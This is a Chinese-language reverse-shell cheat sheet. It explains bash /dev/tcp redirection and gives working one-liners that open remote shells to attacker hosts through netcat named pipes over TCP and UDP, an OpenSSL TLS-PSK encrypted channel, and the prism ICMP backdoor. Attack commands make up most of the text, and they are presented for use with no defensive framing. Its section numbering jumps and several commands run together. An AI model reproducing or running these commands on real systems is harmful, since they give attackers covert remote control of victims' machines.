0x01 bash反弹shell
bash反弹shell是最常见的Linux反弹shell办法。

1.1 bash反弹原理

bash -i 打开一个交互的bash

bash -c “cmd string”  使用shell去运行脚本


linux shell下有三种标准的文件描述符，分别如下：

0 - stdin 代表标准输入,使用<或<<

1 - stdout 代表标准输出,使用>或>>

2 - stderr 代表标准错误输出,使用2>或2>>

 

>&符号的含义，最好的理解：

当>&后面接文件时，表示将标准输出和标准错误输出重定向至文件。

当>&后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符

0>&1 标准输入重定向到标准输出，实现你与反弹出来的shell的交互

 

/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux还存在/dev/udp/

 

优点：在大多数Liunx系统上都可以使用，

缺点：在路由器系统中不存在bash，存在符号>、& 在反序列化中或者对符号转义的情况下就没有办法反弹。


不要忘记检查其他shell,实际情况根据目标系统环境进行sh选择:

sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash

这两者的区别就是是否带-e参数，只有带-e参数的版本才支持反向连接。

缺点：系统apt默认安装的都是不提供反向链接的版本，需要自己上传编译后的二进制版本

2.3 特殊情景（不使用-e选项反弹TCP shell）

仅使用NC反弹 不使用-e选项  TCP


如果目标主机linux发行版本没有-e，在这种情况下可以通过创建管道，然后将默认shell环境的输入重定向给刚才创建的管道，最后将输出重定向到管道中。

rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/bash -i 2>&1 | nc 1.1.1.1 4444   >/tmp/p    #OK  #shell快捷升级成功rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc 1.1.1.1 4444   >/tmp/p#OK  #shell快捷升级成功rm -f /tmp/p; mknod /tmp/p p && nc 1.1.1.1 4444   0</tmp/p | /bin/bash 1>/tmp/p #OK  #shell快捷升级成功rm -f /tmp/p;mknod /tmp/p p && nc 1.1.1.1 4444   0/tmp/p 2>&1      #BUG 未成功连接


 


2.4 特殊情景（不使用-e选项反弹UDP shell）


仅使用NC反弹 不使用-e选项  UDP


攻击者主机上执行监听：

rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/bash -i 2>&1 | nc -u 1.1.1.1 4444   >/tmp/p  #OKrm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc -u 1.1.1.1 4444   >/tmp/p      #OK#/tmp/p是新建的临时文件

注：mkfifo 命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道（根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样），这样就实现了进程间通信。

7.2 OpenSSL TLS-PSK反弹shell

(不依赖于PKI或自签名证书)


# generate 384-bit PSK

# use the generated string as a value for the two PSK variables from belowopenssl rand -hex 48

# server (attacker)

export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT

# client (victim)

export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE

0x19 icmp反弹shell（prism）

如果目标对流量协议进行了限制，也可以尝试采用ICMP协议进行反弹shell。因为通常情况下不会对ICMP协议进行封禁。

地址 https://github.com/andreafabrizi/prism

 

ICMP mode

使用这种操作模式，后门静默地在后台等待包含主机/端口的特定ICMP数据包连接回来，并使用私钥防止第三方访问。

 

首先，在攻击者的机器上运行netcat，以等待来自后门的连接:

$ nc -l -p 6666

使用sendPacket.py脚本(或另一个数据包生成器)发送激活数据包到后门:

./sendPacket.py 192.168.0.1 p4ssw0rd 192.168.0.10 6666192.168.0.1是运行prism后门的受害者机器p4sssw0rd是关键密钥192.168.0.10为攻击者机器地址6666是攻击者机器的端口

 

STATIC mode

使用这种操作模式，后门试图连接到硬编码的IP/端口。

在这种情况下，只需运行netcat监听硬编码的机器/端口:

$ nc -l -p [PORT]

首先下载prism，其中prism.c是我们需要编译的后门文件，sendPacket.py用来触发后门，但是后门文件在我们编译前需要进行一下配置。

设置好以后上传到目标主机进行编译
